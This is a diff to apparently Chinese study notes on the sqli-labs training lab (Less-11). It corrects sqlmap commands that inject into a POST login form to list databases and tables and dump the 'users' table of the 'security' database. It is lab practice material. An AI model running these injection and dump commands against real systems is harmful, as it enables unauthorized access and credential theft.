@@ -48,7 +48,7 @@ sqlmap -u "url" --data "注入数据"
 sqlmap -u "ip/Less-11/" --data="uname=admin&passwd=admin" --batch --dbs #爆库
 ![](assets/Less-11/file-20260530215616818.png)
 
-sqlmap -u "ip/Less-8/?id=1" --data="uname=admin&passwd=admin" --batch -D security --tables #爆库
+sqlmap -u "ip/Less-11/" --data="uname=admin&passwd=admin" --batch -D security --tables #爆表
 ![](assets/Less-11/file-20260530220330691.png)
 
-sqlmap -u "ip/Less-8/?id=1" --data="uname=admin&passwd=admin" --batch -D security -T users --dump #爆数据
+sqlmap -u "ip/Less-11/" --data="uname=admin&passwd=admin" --batch -D security -T users --dump #爆数据
